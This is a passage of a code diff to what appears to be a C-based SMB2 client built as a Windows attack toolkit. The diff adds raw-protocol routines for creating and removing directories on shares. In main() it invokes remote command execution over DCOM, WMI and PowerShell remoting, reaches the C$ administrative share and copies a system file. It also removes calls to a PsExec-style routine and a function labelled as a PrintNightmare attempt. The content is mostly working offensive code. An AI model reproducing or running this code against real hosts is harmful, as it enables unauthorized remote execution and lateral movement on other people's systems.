+    size_t totalSize = sizeof(creq) + pathLenBytes;
+    unsigned char *reqBuf = (unsigned char *)malloc(totalSize);
+    if (!reqBuf) return -1;
+    memcpy(reqBuf, &creq, sizeof(creq));
+    unsigned char *pName = reqBuf + sizeof(creq);
+    for (size_t i = 0; i < strlen(dirPath); i++) {
+        pName[i*2]   = (unsigned char)dirPath[i];
+        pName[i*2+1] = 0x00;
+    }
+    if (sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if (recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        return -1;
+    }
+    if (respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "CreateDirectoryOnShare '%s' failed, status=0x%08X\n", dirPath, respHdr.Status);
+        return -1;
+    }
+    printf("[Client] Directory '%s' created successfully.\n", dirPath);
+    return 0;
+}
+
+/* Remove directory on share. Similar to doDeleteFileOnShare but with directory. */
+int doRemoveDirectoryOnShare(const char *dirPath, uint32_t treeId, uint64_t sessionId) {
+    /* Must open the directory as directory first. Then set info with FileDispositionInformation. */
+    uint64_t fidPersist = 0, fidVolatile = 0;
+    /* Use FILE_DIRECTORY_FILE for directories. */
+    SMB2Header hdr;
+    buildSMB2Header(SMB2_CREATE, treeId, sessionId, &hdr);
+    SMB2CreateRequest creq;
+    memset(&creq, 0, sizeof(creq));
+    creq.StructureSize        = 57;
+    creq.RequestedOplockLevel = 0;
+    creq.ImpersonationLevel   = 2;
+    creq.DesiredAccess        = 0x0012019F;
+    creq.FileAttributes       = 0x00000010;
+    creq.ShareAccess          = 0x00000007;
+    creq.CreateDisposition    = 0x00000001;
+    creq.CreateOptions        = 0x00000001;
+    creq.NameOffset           = sizeof(SMB2CreateRequest);
+    uint32_t pathLenBytes = (uint32_t)(strlen(dirPath)*2);
+    creq.NameLength = (uint16_t)pathLenBytes;
+    size_t totalSize = sizeof(creq) + pathLenBytes;
+    unsigned char *reqBuf = (unsigned char*)malloc(totalSize);
+    if(!reqBuf) return -1;
+    memcpy(reqBuf, &creq, sizeof(creq));
+    unsigned char *pName = reqBuf + sizeof(creq);
+    for(size_t i=0; i<strlen(dirPath); i++) {
+        pName[i*2]   = (unsigned char)dirPath[i];
+        pName[i*2+1] = 0x00;
+    }
+    if(sendSMB2Request(&hdr, reqBuf, totalSize) < 0) {
+        free(reqBuf);
+        return -1;
+    }
+    free(reqBuf);
+    SMB2Header respHdr;
+    unsigned char buf[512];
+    ssize_t payloadLen;
+    if(recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        return -1;
+    }
+    if(respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "Open directory for removal failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    SMB2CreateResponse *cres = (SMB2CreateResponse*)buf;
+    fidPersist  = cres->FileIdPersistent;
+    fidVolatile = cres->FileIdVolatile;
+
+    buildSMB2Header(SMB2_SET_INFO, treeId, sessionId, &hdr);
+    SMB2SetInfoRequest sreq;
+    memset(&sreq, 0, sizeof(sreq));
+    sreq.StructureSize     = 33;
+    sreq.InfoType          = 0x01;
+    sreq.FileInfoClass     = 0x0D; /* FileDispositionInformation */
+    sreq.BufferLength      = 1;
+    sreq.BufferOffset      = sizeof(SMB2SetInfoRequest);
+    sreq.FileIdPersistent  = fidPersist;
+    sreq.FileIdVolatile    = fidVolatile;
+
+    unsigned char reqDel[sizeof(sreq)+1];
+    memcpy(reqDel, &sreq, sizeof(sreq));
+    reqDel[sizeof(sreq)] = 1;
+
+    if(sendSMB2Request(&hdr, reqDel, sizeof(reqDel)) < 0) {
+        return -1;
+    }
+    if(recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        return -1;
+    }
+    if(respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "SetInfo to remove directory failed, status=0x%08X\n", respHdr.Status);
+    }
+
+    /* Close the dir handle. */
+    buildSMB2Header(SMB2_CLOSE, treeId, sessionId, &hdr);
+    SMB2CloseRequest creq2;
+    memset(&creq2, 0, sizeof(creq2));
+    creq2.StructureSize     = 24;
+    creq2.Flags             = 0;
+    creq2.FileIdPersistent  = fidPersist;
+    creq2.FileIdVolatile    = fidVolatile;
+    if(sendSMB2Request(&hdr, &creq2, sizeof(creq2)) < 0) {
+        return -1;
+    }
+    if(recvSMB2Response(&respHdr, buf, sizeof(buf), &payloadLen) < 0) {
+        return -1;
+    }
+    if(respHdr.Status != STATUS_SUCCESS) {
+        fprintf(stderr, "Close directory handle failed, status=0x%08X\n", respHdr.Status);
+        return -1;
+    }
+    printf("[Client] Removed directory '%s'.\n", dirPath);
+    return 0;
+}
+/* ------------------------------------------------------------------------ */
 
 int main(int argc, char *argv[]) {
     if (argc < 3) {
@@ -1738,20 +2157,22 @@ int main(int argc, char *argv[]) {
     unsigned char dummyIoctlData[] = { 0x01, 0x02, 0x03, 0x04 };
     doIOCTL(0x0011C017, dummyIoctlData, sizeof(dummyIoctlData));
 
-    unsigned char readBuf[512];
-    memset(readBuf, 0, sizeof(readBuf));
-    uint32_t bytesRead = 0;
-    if (doReadPipe(readBuf, sizeof(readBuf), &bytesRead) < 0) {
-        fprintf(stderr, "Read from pipe failed.\n");
-    } else {
-        if (bytesRead > 0) {
-            printf("[Client] Pipe response (hex):\n");
-            for (uint32_t i = 0; i < bytesRead; i++) {
-                printf("%02X ", readBuf[i]);
-            }
-            printf("\n");
+    {
+        unsigned char readBuf[512];
+        memset(readBuf, 0, sizeof(readBuf));
+        uint32_t bytesRead = 0;
+        if (doReadPipe(readBuf, sizeof(readBuf), &bytesRead) < 0) {
+            fprintf(stderr, "Read from pipe failed.\n");
         } else {
-            printf("[Client] No data returned from pipe.\n");
+            if (bytesRead > 0) {
+                printf("[Client] Pipe response (hex):\n");
+                for (uint32_t i = 0; i < bytesRead; i++) {
+                    printf("%02X ", readBuf[i]);
+                }
+                printf("\n");
+            } else {
+                printf("[Client] No data returned from pipe.\n");
+            }
         }
     }
 
@@ -1819,11 +2240,21 @@ int main(int argc, char *argv[]) {
 
     doDCOMExec("whoami");
     doWMIExec("dir C:\\");
+    doPowerShellRemotingExec("Get-Process");
 
-    doPSExec("C:\\Windows\\System32\\cmd.exe /c echo HelloFromPsExec");
-
-    /* Enhanced function invocation for PrintNightmare attempt. */
-    doPrintNightmare();
+    /* Demo usage of new filesystem capabilities */
+    if (doTreeConnect("\\\\127.0.0.1\\C$") == 0) {
+        /* List C:\Windows directory */
+        doListDirectory("C:\\Windows", gTreeId, gSessionId);
+        /* Create a directory */
+        doCreateDirectoryOnShare("C:\\Temp\\TestDir", gTreeId, gSessionId);
+        /* Remove that directory */
+        doRemoveDirectoryOnShare("C:\\Temp\\TestDir", gTreeId, gSessionId);
+        /* Download a file */
+        doReadFileFromShare("C:\\Windows\\System32\\drivers\\etc\\hosts", "hosts_local_copy", gTreeId, gSessionId);
+        /* Delete a file (example, not recommended to do on real system) */
+        /* doDeleteFileOnShare("C:\\Temp\\unwanted.txt", gTreeId, gSessionId); */
+    }
 
     close(gSock);
     printf("[Client] Done.\n");
